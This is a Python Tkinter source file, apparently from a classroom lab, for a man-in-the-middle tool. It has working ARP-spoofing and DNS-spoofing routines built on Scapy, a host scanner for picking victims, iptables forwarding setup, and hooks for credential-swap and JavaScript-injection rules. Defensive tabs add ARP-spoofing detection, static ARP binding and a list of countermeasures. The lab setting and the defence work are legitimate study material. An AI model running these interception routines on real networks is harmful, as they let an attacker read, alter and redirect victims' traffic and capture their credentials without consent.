        self.fake_user_var = self.rule_params.get("cred_swap.fake_user")
        self.fake_pass_var = self.rule_params.get("cred_swap.fake_pass")

    def _add_rule_block(self, parent, key, label, desc, params):
        """為一個攔截規則建立含勾選與參數欄位的 LabelFrame。"""
        frame = tk.LabelFrame(
            parent, text=f"  {label}  ",
            bg="#0d1117", fg="#58a6ff",
            font=("Courier New", 10, "bold"), bd=1, relief=tk.GROOVE)
        frame.pack(fill=tk.X, pady=4, padx=4)

        # 啟用勾選框 + 描述
        top = tk.Frame(frame, bg="#0d1117")
        top.pack(fill=tk.X, padx=8, pady=4)

        var = tk.BooleanVar(value=False)
        self.rule_vars[key] = var
        tk.Checkbutton(
            top, text="啟用", variable=var,
            bg="#0d1117", fg="#c9d1d9",
            selectcolor="#21262d",
            activebackground="#0d1117", activeforeground="#58a6ff",
            font=("Courier New", 10, "bold")
        ).pack(side=tk.LEFT)

        tk.Label(top, text=desc, bg="#0d1117", fg="#8b949e",
                 font=("Courier New", 9)).pack(side=tk.LEFT, padx=8)

        # 參數欄位
        for param_key, param_label, default, width in params:
            full_key = f"{key}.{param_key}"
            row = tk.Frame(frame, bg="#0d1117")
            row.pack(fill=tk.X, padx=8, pady=2)

            tk.Label(row, text=param_label, bg="#0d1117",
                     fg="#c9d1d9", font=("Courier New", 9),
                     width=14, anchor=tk.W).pack(side=tk.LEFT)

            if width is None:
                # 多行 Text widget（給 JS payload 用）
                txt = tk.Text(row, height=6, bg="#21262d", fg="#c9d1d9",
                              insertbackground="white",
                              font=("Courier New", 9), relief=tk.FLAT, bd=4,
                              wrap=tk.NONE)
                txt.insert("1.0", default)
                txt.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))
                self.rule_params[full_key] = txt
            else:
                # 單行 Entry
                var2 = tk.StringVar(value=default)
                tk.Entry(row, textvariable=var2, width=width,
                         bg="#21262d", fg="#c9d1d9",
                         insertbackground="white",
                         font=("Courier New", 9), relief=tk.FLAT, bd=4
                         ).pack(side=tk.LEFT, padx=(0, 8))
                self.rule_params[full_key] = var2

        # 留白
        tk.Frame(frame, bg="#0d1117", height=4).pack()


    def _get_rule_param(self, key, fallback=""):
        """從 self.rule_params 取出參數值，自動處理 StringVar 與 Text 兩種型別。"""
        widget = self.rule_params.get(key)
        if widget is None:
            return fallback
        if isinstance(widget, tk.StringVar):
            return widget.get() or fallback
        # Text widget
        return widget.get("1.0", tk.END).rstrip("\n") or fallback


    # 分頁 4：防禦偵測
    def _build_tab_defense(self, parent):
        pad = {"padx": 14, "pady": 6}

        tk.Label(
            parent,
            text="防禦模組：使用 Scapy 偵測 ARP Spoofing 攻擊",
            bg="#0d1117", fg="#3fb950", font=("Courier New", 10, "bold")
        ).pack(anchor=tk.W, **pad)

        df = tk.Frame(parent, bg="#0d1117")
        df.pack(fill=tk.X, **pad)

        tk.Label(df, text="監聽介面:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)
        self.def_iface_entry = tk.Entry(
            df, width=8, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.def_iface_entry.insert(0, "eth1")
        self.def_iface_entry.pack(side=tk.LEFT, padx=6)

        tk.Label(df, text="監控 IP:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)
        self.def_watch_ip_entry = tk.Entry(
            df, width=14, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.def_watch_ip_entry.insert(0, "10.0.0.6")
        self.def_watch_ip_entry.pack(side=tk.LEFT, padx=6)

        tk.Label(df, text="正確 MAC:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)
        self.def_expected_mac_entry = tk.Entry(
            df, width=20, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.def_expected_mac_entry.insert(0, "08:00:27:79:b1:34")
        self.def_expected_mac_entry.pack(side=tk.LEFT, padx=6)

        self._btn(df, " 啟動防禦偵測", self._start_defense, "#1f6feb").pack(side=tk.LEFT, padx=6)
        self._btn(df, " 停止", self._stop_defense, "#374151").pack(side=tk.LEFT, padx=6)

        wf = tk.Frame(parent, bg="#0d1117")
        wf.pack(fill=tk.BOTH, expand=True, **pad)

        self.def_text = tk.Text(
            wf,
            bg="#010409", fg="#3fb950",
            font=("Courier New", 9),
            relief=tk.FLAT, bd=4,
            wrap=tk.WORD
        )
        self.def_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        dsb2 = ttk.Scrollbar(wf, orient=tk.VERTICAL, command=self.def_text.yview)
        self.def_text.configure(yscrollcommand=dsb2.set)
        dsb2.pack(side=tk.RIGHT, fill=tk.Y)

        self.def_text.tag_config("warn", foreground="#f85149", font=("Courier New", 9, "bold"))
        self.def_text.tag_config("ok", foreground="#3fb950")
        self.def_text.tag_config("info", foreground="#8b949e")

        tips = tk.LabelFrame(
            parent, text=" 防禦邏輯與對策 ",
            bg="#0d1117", fg="#3fb950",
            font=("Courier New", 9, "bold"), bd=1, relief=tk.GROOVE)
        tips.pack(fill=tk.X, **pad)

        measures = [
            "1. 基本偵測：同一個 IP 若對應到多個 MAC，可能發生 ARP Spoofing。",
            "2. 強化偵測：指定重要主機的合法 MAC，若出現非預期 MAC，立即警告。",
            "3. 本實驗 Watch IP = 10.0.0.6，Expected MAC = 08:00:27:79:b1:34。",
            "4. 防禦方法：靜態 ARP 綁定、Dynamic ARP Inspection、ArpWatch、VPN、HTTPS/HSTS。",
        ]
        for m in measures:
            tk.Label(tips, text=m, bg="#0d1117", fg="#c9d1d9",
                     font=("Courier New", 8), anchor=tk.W).pack(fill=tk.X, padx=8, pady=1)
    # 分頁 7：Ubuntu Victim 端防禦
    def _build_tab_victim_defense(self, parent):
        pad = {"padx": 14, "pady": 6}

        tk.Label(
            parent,
            text="Ubuntu Victim 防禦模組：靜態 ARP 綁定與 ARP 表檢查",
            bg="#0d1117", fg="#3fb950",
            font=("Courier New", 10, "bold")
        ).pack(anchor=tk.W, **pad)

        info = (
            "此分頁主要在 Ubuntu 受害者端使用。\n"
            "目的：將 Server IP 固定綁定到正確 MAC，避免 ARP Spoofing 污染受害者 ARP 表。"
        )

        tk.Label(
            parent,
            text=info,
            bg="#0d1117", fg="#8b949e",
            font=("Courier New", 9),
            justify=tk.LEFT
        ).pack(anchor=tk.W, **pad)

        form = tk.Frame(parent, bg="#0d1117")
        form.pack(fill=tk.X, **pad)

        tk.Label(
            form,
            text="保護的 Server IP:",
            bg="#0d1117", fg="#c9d1d9",
            font=("Courier New", 10)
        ).pack(side=tk.LEFT)

        self.static_arp_ip_entry = tk.Entry(
            form,
            width=16,
            bg="#21262d", fg="#c9d1d9",
            insertbackground="white",
            font=("Courier New", 10),
            relief=tk.FLAT, bd=4
        )
        self.static_arp_ip_entry.insert(0, "10.0.0.6")
        self.static_arp_ip_entry.pack(side=tk.LEFT, padx=(4, 14))

        tk.Label(
            form,
            text="正確 MAC:",
            bg="#0d1117", fg="#c9d1d9",
            font=("Courier New", 10)
        ).pack(side=tk.LEFT)

        self.static_arp_mac_entry = tk.Entry(
            form,
            width=22,
            bg="#21262d", fg="#c9d1d9",
            insertbackground="white",
            font=("Courier New", 10),
            relief=tk.FLAT, bd=4
        )
        self.static_arp_mac_entry.insert(0, "08:00:27:79:b1:34")
        self.static_arp_mac_entry.pack(side=tk.LEFT, padx=(4, 14))

        btn_frame = tk.Frame(parent, bg="#0d1117")
        btn_frame.pack(fill=tk.X, **pad)

        self._btn(
            btn_frame,
            " 啟動靜態 ARP 防禦",
            self._enable_static_arp,
            "#166534"
        ).pack(side=tk.LEFT, padx=(0, 8))

        self._btn(
            btn_frame,
            " 解除靜態 ARP 防禦",
            self._disable_static_arp,
            "#b91c1c"
        ).pack(side=tk.LEFT, padx=(0, 8))

        self._btn(
            btn_frame,
            " 查看 ARP 表",
            self._show_arp_table,
            "#1f6feb"
        ).pack(side=tk.LEFT)

        output_frame = tk.Frame(parent, bg="#0d1117")
        output_frame.pack(fill=tk.BOTH, expand=True, **pad)

        self.victim_def_text = tk.Text(
            output_frame,
            bg="#010409", fg="#e6edf3",
            font=("Courier New", 9),
            relief=tk.FLAT, bd=4,
            wrap=tk.WORD
        )
        self.victim_def_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        sb = ttk.Scrollbar(
            output_frame,
            orient=tk.VERTICAL,
            command=self.victim_def_text.yview
        )
        self.victim_def_text.configure(yscrollcommand=sb.set)
        sb.pack(side=tk.RIGHT, fill=tk.Y)

        self.victim_def_text.tag_config("ok", foreground="#3fb950")
        self.victim_def_text.tag_config("warn", foreground="#f85149", font=("Courier New", 9, "bold"))
        self.victim_def_text.tag_config("info", foreground="#8b949e")

    def _victim_def_insert(self, text, tag="info"):
        def _do():
            self.victim_def_text.insert(tk.END, text, tag)
            self.victim_def_text.see(tk.END)
        self.root.after(0, _do)

    def _enable_static_arp(self):
        ip = self.static_arp_ip_entry.get().strip()
        mac = self.static_arp_mac_entry.get().strip()

        if not ip or not mac:
            messagebox.showwarning("警告", "請輸入 Server IP 與正確 MAC。")
            return

        cmd = ["arp", "-s", ip, mac]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                self._victim_def_insert(
                    f"[OK] 已啟動靜態 ARP 防禦：{ip} → {mac}\n",
                    "ok"
                )
                self._log(f"靜態 ARP 防禦已啟動：{ip} → {mac}", "OK")
                self._show_arp_table()
            else:
                self._victim_def_insert(
                    f"[ERROR] 靜態 ARP 設定失敗：\n{result.stderr}\n",
                    "warn"
                )
                self._log("靜態 ARP 設定失敗，請確認是否使用 sudo 執行。", "WARN")

        except Exception as e:
            self._victim_def_insert(f"[ERROR] {e}\n", "warn")
            self._log(f"靜態 ARP 防禦錯誤：{e}", "WARN")

    def _disable_static_arp(self):
        ip = self.static_arp_ip_entry.get().strip()

        if not ip:
            messagebox.showwarning("警告", "請輸入要解除綁定的 Server IP。")
            return

        cmd = ["arp", "-d", ip]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                self._victim_def_insert(
                    f"[OK] 已解除靜態 ARP 綁定：{ip}\n",
                    "ok"
                )
                self._log(f"靜態 ARP 綁定已解除：{ip}", "OK")
                self._show_arp_table()
            else:
                self._victim_def_insert(
                    f"[ERROR] 解除靜態 ARP 失敗：\n{result.stderr}\n",
                    "warn"
                )
                self._log("解除靜態 ARP 失敗。", "WARN")

        except Exception as e:
            self._victim_def_insert(f"[ERROR] {e}\n", "warn")
            self._log(f"解除靜態 ARP 錯誤：{e}", "WARN")

    def _show_arp_table(self):
        try:
            result = subprocess.run(
                ["arp", "-a"],
                capture_output=True,
                text=True
            )

            self._victim_def_insert("\n========== 目前 ARP Table ==========\n", "info")
            if result.stdout.strip():
                self._victim_def_insert(result.stdout + "\n", "info")
            else:
                self._victim_def_insert("目前沒有 ARP 紀錄。\n", "info")
            self._victim_def_insert("====================================\n\n", "info")

        except Exception as e:
            self._victim_def_insert(f"[ERROR] 無法查看 ARP 表：{e}\n", "warn")
            self._log(f"查看 ARP 表錯誤：{e}", "WARN")
    # 共用元件
    def _btn(self, parent, text, cmd, color):
        return tk.Button(
            parent, text=text, command=cmd,
            bg=color, fg="white",
            font=("Courier New", 9, "bold"),
            relief=tk.FLAT, padx=10, pady=4,
            activebackground=color, activeforeground="white",
            cursor="hand2"
        )

    def _log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        prefix = {"WARN": "⚠ WARN", "OK": "✔ OK  ", "INFO": "◆ INFO"}.get(level, "◆ INFO")
        full_msg = f"[{ts}] {prefix} │ {msg}\n"

        def _insert():
            self.log_text.insert(tk.END, full_msg)
            self.log_text.see(tk.END)
            self.log_text.update_idletasks()

        try:
            self.root.after(0, _insert)
            self.root.update_idletasks()
        except Exception:
            pass

    # 掃描功能
    def _scan_thread(self):
        net = self.network_entry.get().strip()
        if not net:
            return
        self.scan_btn.config(state=tk.DISABLED, text="掃描中…")
        for item in self.tree.get_children():
            self.tree.delete(item)
        self._log(f"開始掃描: {net}")
        threading.Thread(target=self._run_scan, args=(net,), daemon=True).start()

    def _run_scan(self, net):
        try:
            self.nm.scan(hosts=net, arguments="-sn -n --host-timeout 5s")
            for host in self.nm.all_hosts():
                if self.nm[host].state() == "up":
                    mac      = self.nm[host]["addresses"].get("mac", "未知")
                    hostname = self.nm[host].hostname() or "未知"
                    os_match = "存活"
                    self.root.after(
                        0, lambda h=host, m=mac, hn=hostname, o=os_match:
                        self.tree.insert("", tk.END, values=(h, m, hn, o))
                    )
            self._log("掃描完成！請點擊表格選擇受害者。", "OK")
        except Exception as e:
            self._log(f"掃描出錯: {e}", "WARN")
        finally:
            self.root.after(0, lambda: self.scan_btn.config(state=tk.NORMAL, text=" 掃描區網"))

    def _on_tree_select(self, _event):
        item = self.tree.focus()
        if item:
            ip = self.tree.item(item, "values")[0]
            self.victim_entry.delete(0, tk.END)
            self.victim_entry.insert(0, ip)

    # ARP Spoofing
    def _start_arp(self):
        victim_ip  = self.victim_entry.get().strip()
        gateway_ip = self.gateway_entry.get().strip()
        iface      = self.arp_iface_entry.get().strip() or "eth1"
        if not victim_ip or not gateway_ip:
            messagebox.showwarning("警告", "請填寫受害者 IP 與 Target/Server IP！")
            return

        self._log(f"使用介面: {iface}")
        self._log("開啟 IP 轉發 (net.ipv4.ip_forward=1)…")
        os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        os.system("iptables -F FORWARD > /dev/null 2>&1")
        os.system("iptables -P FORWARD ACCEPT > /dev/null 2>&1")
        os.system("iptables -t nat -F > /dev/null 2>&1")
        os.system(f"iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE > /dev/null 2>&1")
        self._log("iptables 轉發規則設定完成。", "OK")

        self.is_spoofing = True
        self.attack_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        threading.Thread(
            target=self._arp_thread, args=(victim_ip, gateway_ip, iface), daemon=True
        ).start()

    def _resolve_mac(self, ip, iface):
        """在指定介面上發 ARP request 取得 MAC，避免 scapy 走錯網卡。"""
        from scapy.all import srp
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=iface, timeout=2, verbose=False
            )
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            self._log(f"ARP 查詢錯誤 ({ip} on {iface}): {e}", "WARN")
        return None

    def _arp_thread(self, victim_ip, gateway_ip, iface):
        from scapy.all import get_if_hwaddr
        self._log(f"在 {iface} 上查詢 MAC：{victim_ip} / {gateway_ip}…")
        victim_mac  = self._resolve_mac(victim_ip, iface)
        gateway_mac = self._resolve_mac(gateway_ip, iface)

        if not victim_mac or not gateway_mac:
            self._log("MAC 取得失敗，確認目標 IP 存活且介面正確。", "WARN")
            self.is_spoofing = False
            self.root.after(0, lambda: self.attack_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.stop_btn.config(state=tk.DISABLED))
            return

        try:
            attacker_mac = get_if_hwaddr(iface)
        except Exception as e:
            self._log(f"無法取得介面 {iface} 的 MAC: {e}", "WARN")
            return

        self._log(f"受害者 MAC: {victim_mac}", "OK")
        self._log(f"Target MAC:  {gateway_mac}", "OK")
        self._log(f"攻擊者 MAC:  {attacker_mac} ({iface})", "OK")
        self._log(f"ARP Spoofing 啟動！在 {iface} 上攔截 {victim_ip} ↔ {gateway_ip}", "OK")

        while self.is_spoofing:
            # 告訴受害者：gateway_ip 在攻擊者的 MAC
            sendp(Ether(dst=victim_mac) / ARP(
                op=2, pdst=victim_ip, hwdst=victim_mac,
                psrc=gateway_ip, hwsrc=attacker_mac
            ), iface=iface, verbose=False)
            # 告訴 gateway：victim_ip 在攻擊者的 MAC
            sendp(Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=victim_ip, hwsrc=attacker_mac
            ), iface=iface, verbose=False)
            time.sleep(2)

    def _stop_arp(self):
        self.is_spoofing = False
        self.stop_btn.config(state=tk.DISABLED)
        self._log("停止 ARP 攻擊，恢復 ARP 表…")
        threading.Thread(target=self._restore_arp, daemon=True).start()

    def _restore_arp(self):
        victim_ip  = self.victim_entry.get().strip()
        gateway_ip = self.gateway_entry.get().strip()
        iface      = self.arp_iface_entry.get().strip() or "eth1"
        victim_mac  = self._resolve_mac(victim_ip, iface)
        gateway_mac = self._resolve_mac(gateway_ip, iface)
        if victim_mac and gateway_mac:
            sendp(Ether(dst=victim_mac) / ARP(
                op=2, pdst=victim_ip, hwdst=victim_mac,
                psrc=gateway_ip, hwsrc=gateway_mac
            ), iface=iface, count=5, verbose=False)
            sendp(Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=victim_ip, hwsrc=victim_mac
            ), iface=iface, count=5, verbose=False)
        os.system("sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
        self._log("網路 ARP 表已恢復，IP 轉發已關閉。", "OK")
        self.root.after(0, lambda: self.attack_btn.config(state=tk.NORMAL))

    def _open_wireshark(self):
        iface = self.iface_entry.get().strip() if hasattr(self, "iface_entry") else "eth0"
        try:
            subprocess.Popen(["wireshark", "-i", iface, "-k"])
            self._log(f"Wireshark 已啟動，監聽介面: {iface}", "OK")
        except FileNotFoundError:
            self._log("找不到 Wireshark，請確認已安裝：apt install wireshark-qt", "WARN")

    # DNS Spoofing
    def _add_dns_rule(self):
        domain = self.dns_domain_entry.get().strip().rstrip(".")
        fake_ip = self.dns_fake_ip_entry.get().strip()
        if not domain or not fake_ip:
            messagebox.showwarning("警告", "請填寫網域與偽造 IP！")
            return
        self.dns_spoof_map[domain] = fake_ip
        self.dns_tree.insert("", tk.END, values=(domain, fake_ip))
        self._log(f"DNS 規則加入：{domain} → {fake_ip}", "OK")

    def _remove_dns_rule(self):
        sel = self.dns_tree.focus()
        if sel:
            vals = self.dns_tree.item(sel, "values")
            self.dns_spoof_map.pop(vals[0], None)
            self.dns_tree.delete(sel)
            self._log(f"移除 DNS 規則：{vals[0]}", "OK")

    def _start_dns_spoof(self):
        if not self.dns_spoof_map:
            messagebox.showwarning("警告", "請先加入至少一條 DNS Spoofing 規則！")
            return
        if not self.is_spoofing:
            messagebox.showwarning("提示", "建議先啟動 ARP Spoofing，否則只能攔截本機 DNS 查詢。")
        self.is_dns_spoof = True
        self._log("DNS Spoofing 已啟動，等待受害者發出 DNS 查詢…", "OK")
        iface = self.iface_entry.get().strip() if hasattr(self, "iface_entry") else "eth0"
        threading.Thread(
            target=self._dns_sniff_thread, args=(iface,), daemon=True
        ).start()

    def _stop_dns_spoof(self):
        self.is_dns_spoof = False
        self._log("DNS Spoofing 已停止。", "OK")

    def _dns_sniff_thread(self, iface):
        def _process(pkt):
            if not self.is_dns_spoof:
                return
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):   # 只處理 DNS 查詢
                return
            queried = pkt[DNSQR].qname.decode().rstrip(".")
            for domain, fake_ip in self.dns_spoof_map.items():
                if domain in queried:
                    spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=53) / \
                              DNS(
                                  id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                  an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=fake_ip)
                              )
                    send(spoofed, verbose=False, iface=iface)
                    self._log(f"DNS Spoofing：{queried} → {fake_ip} (來源:{pkt[IP].src})", "WARN")
                    return

        try:
            sniff(
                filter="udp port 53",
                prn=_process,
                iface=iface,
                stop_filter=lambda _: not self.is_dns_spoof,
                store=False
            )
        except Exception as e:
            self._log(f"DNS 嗅探錯誤: {e}", "WARN")


    # 防禦偵測（ARP Spoofing 偵測）
    def _start_defense(self):
        iface = self.def_iface_entry.get().strip() or "eth1"
        watch_ip = self.def_watch_ip_entry.get().strip()
        expected_mac = self.def_expected_mac_entry.get().strip().lower()

        self.is_defending = True
        self._def_insert("防禦偵測啟動，監聽 ARP Reply...\n", "ok")
        self._def_insert(f"Interface    : {iface}\n", "info")
        self._def_insert(f"Watch IP     : {watch_ip or '未指定'}\n", "info")
        self._def_insert(f"Expected MAC : {expected_mac or '未指定'}\n\n", "info")

        self._log(
            f"防禦模組啟動，介面={iface}, Watch IP={watch_ip}, Expected MAC={expected_mac}",
            "OK"
        )

        threading.Thread(
            target=self._defense_thread,
            args=(iface, watch_ip, expected_mac),
            daemon=True
        ).start()

    def _stop_defense(self):
        self.is_defending = False
        self._def_insert("防禦偵測已停止。\n", "info")
        self._log("防禦模組已停止。", "OK")

    def _normalize_mac(self, mac):
        return (mac or "").lower().strip()

    def _defense_thread(self, iface, watch_ip="", expected_mac=""):
        ip_mac_map = defaultdict(set)
        expected_mac = self._normalize_mac(expected_mac)

        def _process(pkt):
            if not self.is_defending:
                return

            if not pkt.haslayer(ARP):
                return

            arp = pkt[ARP]

            # op=2 代表 ARP Reply，是 ARP Spoofing 最常偽造的封包
            if arp.op != 2:
                return

            src_ip = arp.psrc
            src_mac = self._normalize_mac(arp.hwsrc)
            now = datetime.now().strftime("%H:%M:%S")

            ip_mac_map[src_ip].add(src_mac)

            self._def_insert(f"[{now}] ARP Reply: {src_ip} -> {src_mac}\n", "info")

            # 強化版偵測：指定 Watch IP 與 Expected MAC
            if watch_ip and expected_mac and src_ip == watch_ip and src_mac != expected_mac:
                warn_msg = (
                    f"\n==============================\n"
                    f"[{now}] WARNING: ARP Spoofing Detected!\n"
                    f"Watched IP   : {src_ip}\n"
                    f"Expected MAC : {expected_mac}\n"
                    f"Current MAC  : {src_mac}\n"
                    f"Reason       : The IP is using an unexpected MAC address.\n"
                    f"==============================\n\n"
                )
                self._def_insert(warn_msg, "warn")
                self._log(f"偵測到 ARP Spoofing！{src_ip} 被宣告成 {src_mac}", "WARN")
                return

            # 基本版偵測：同一 IP 出現多個 MAC
            if len(ip_mac_map[src_ip]) > 1:
                macs = sorted(ip_mac_map[src_ip])
                warn_msg = (
                    f"\n==============================\n"
                    f"[{now}] WARNING: Possible ARP Spoofing Detected!\n"
                    f"IP Address : {src_ip}\n"
                    f"MAC List   : {' / '.join(macs)}\n"
                    f"Reason     : Same IP maps to multiple MAC addresses.\n"
                    f"==============================\n\n"
                )
                self._def_insert(warn_msg, "warn")
                self._log(f"偵測到 ARP Spoofing 攻擊！IP={src_ip}", "WARN")

        try:
            sniff(
                filter="arp",
                prn=_process,
                iface=iface,
                stop_filter=lambda _: not self.is_defending,
                store=False
            )
        except Exception as e:
            self._log(f"防禦偵測錯誤: {e}", "WARN")

    def _def_insert(self, text, tag):
        def _do():
            self.def_text.insert(tk.END, text, tag)
            self.def_text.see(tk.END)
        self.root.after(0, _do)

# =============================================================================
# 程式進入點
# =============================================================================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] 此工具需要 root 權限，請使用 sudo 執行：")
        print("    sudo python3 mitm_tool.py")
        exit(1)

    root = tk.Tk()
    app  = MitmApp(root)
    root.mainloop()
